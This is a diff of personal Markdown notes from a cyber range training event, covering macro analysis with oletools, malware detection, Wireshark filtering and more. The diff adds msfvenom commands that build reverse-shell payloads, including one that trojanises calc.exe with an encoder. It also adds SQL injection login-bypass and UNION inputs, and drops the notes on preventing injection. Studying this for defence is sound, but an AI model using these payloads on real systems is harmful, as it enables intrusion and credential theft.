@@ -1,19 +1,17 @@
+<!--
+Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
+Author: Simon .I
+Version: 2025.03.30
+Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
+-->
+
 <!-- ASD Programme Title -->
-<h1 align="center"><strong>ASD</strong></h1>
+<h1 align="center"><strong style="font-size: 4rem; letter-spacing: 4px; color: navy;">ASD</strong></h1>
 
-<p style="color: black;"><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>
-
----
+<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>
 
 <details>
 <summary><strong>🌐 LFE 1 Bangalore - Malicious Detection</strong></summary>
-
-### 🛠 Topics Covered
-- Process and task investigation
-- Scheduled task review and removal
-- Registry autorun inspection
-- Network port activity check
-- Suspicious file hunting
 
 ### 🔎 Scenario: Command and Control (C2) Detection
 
@@ -72,12 +70,14 @@ Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorA
 <details>
 <summary><strong>🌋 LFE 2 Jakarta - Multi-Stage Malware & Analysis</strong></summary>
 
-### 🛠 Topics Covered
-- Office macro analysis with oletools
-- Payload creation using msfvenom
-- File encryption via OpenSSL
-- Network inspection with Wireshark
-- Basic SQL injection testing
+### 🔎 Scenario: Multi-Stage Malware with Data Exfiltration
+
+- Analyse a malicious Office macro embedded in a phishing document
+- Trace execution of an obfuscated VB script delivering a reverse shell payload
+- Investigate payload generated using `msfvenom` to understand its capabilities
+- Identify encrypted files and inspect use of OpenSSL for local encryption
+- Monitor network activity and identify exfiltration using Wireshark
+- Discover and exploit an SQL injection vulnerability for unauthorised data access
 
 ### 🔎 Macro Analysis with `oletools`
 
@@ -85,65 +85,49 @@ Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorA
 
 #### 🔧 Common Tools & Flags:
 ```bash
-olevba -a suspicious.doc      # Full analysis
-olevba -c suspicious.doc      # Extract macro code only
-olevba --decode suspicious.doc # Decode obfuscated content
-olevba --json suspicious.doc  # Output in JSON
+olevba -a suspicious.doc
+olevba -c suspicious.doc
+olevba --decode suspicious.doc
+olevba --json suspicious.doc
 
-mraptor suspicious.doc        # Detect risky macro patterns
+mraptor suspicious.doc
 mraptor --json suspicious.doc
 
-olemeta suspicious.doc        # Extract file metadata
+olemeta suspicious.doc
 olemeta --json suspicious.doc
 
-oleid suspicious.doc          # File structure and risk features
+oleid suspicious.doc
 oleid --json suspicious.doc
 
-oleobj -e -d output suspicious.doc # Extract embedded OLE objects
-rtfobj -d output suspicious.rtf    # Extract objects from RTF
+oleobj -e -d output suspicious.doc
+rtfobj -d output suspicious.rtf
 ```
 
 ### 💣 Payload Crafting with `msfvenom`
 
-`msfvenom` combines `msfpayload` and `msfencode`, allowing you to create encoded payloads in various formats for different platforms.
-
-#### 🧪 Command Structure:
 ```bash
 msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
 ```
 
 #### 🧾 Flag Breakdown:
-- `-p`: Payload type (e.g., `windows/meterpreter/reverse_tcp`)
-- `LHOST`: Attacker IP to receive the connection
+- `-p`: Payload type
+- `LHOST`: Attacker IP
 - `LPORT`: Listener port
-- `-f`: Output format (e.g., `exe`, `elf`, `asp`, `raw`, `psh`)
-- `-o`: Output filename
-- `-e`: Encoder (e.g., `x86/shikata_ga_nai`)
-- `-i`: Number of encoding iterations
-- `-x`: Inject into a legitimate executable (trojanise)
-
-#### 📦 Common Formats:
-- `exe`: Windows executables
-- `elf`: Linux binaries
-- `psh`: PowerShell commands
-- `raw`, `asp`, `war`, `vbscript`, `bash`, `c`, etc.
-
-#### 🔁 Encoders:
-Encoders help obfuscate payloads to evade signature-based AV:
-```bash
-msfvenom -l encoders
-```
-Example encoder: `x86/shikata_ga_nai`
+- `-f`: Output format (e.g. exe, elf, psh)
+- `-o`: Output file
+- `-e`: Encoder
+- `-i`: Iterations
+- `-x`: Inject into another executable
 
 #### 🧰 Examples:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe
-```
 ```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe
+
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
 ```
 
 ### 🔐 File Encryption with OpenSSL
-```powershell
+```bash
 openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
 ```
 
@@ -156,12 +140,13 @@ frame.number == 1437 and tcp.analysis.retransmission
 ```
 
 ### 🔢 SQL Injection Basics
-**Used on login forms where inputs are not sanitised**
 
-#### Sample Username/Password Inputs:
-```plaintext
+**SQL injection** was found in a web-based login form hosted on the compromised environment.
+
+#### Sample Inputs:
+```text
 Username: ' OR 1=1;--
-Password: (blank or anything)
+Password: anything
 
 Username: admin' --
 Password: anything
@@ -171,28 +156,24 @@ Password: anything
 
 Username: " OR ""="
 Password: anything
+
+Username: ' OR 1=1 LIMIT 1;--
+Password: doesn't matter
+
+Username: admin')--
+Password: test
+
+Username: ' UNION SELECT null, version();--
+Password: anything
 ```
 
 #### Underlying Query Logic:
 ```sql
 SELECT * FROM users WHERE username = 'admin' AND password = 'password';
 ```
+
 Injecting:
 ```sql
 SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
 ```
-
-#### SQL Clause Order Reference:
-1. `SELECT`
-2. `FROM`
-3. `WHERE`
-4. `GROUP BY` / `HAVING`
-5. `ORDER BY`
-
-#### SQL Injection Prevention:
-- Use prepared statements / parameterised queries
-- Sanitize user inputs (strip/escape)
-- Apply least privilege to DB accounts
-- Log and alert on suspicious queries
-
 </details>
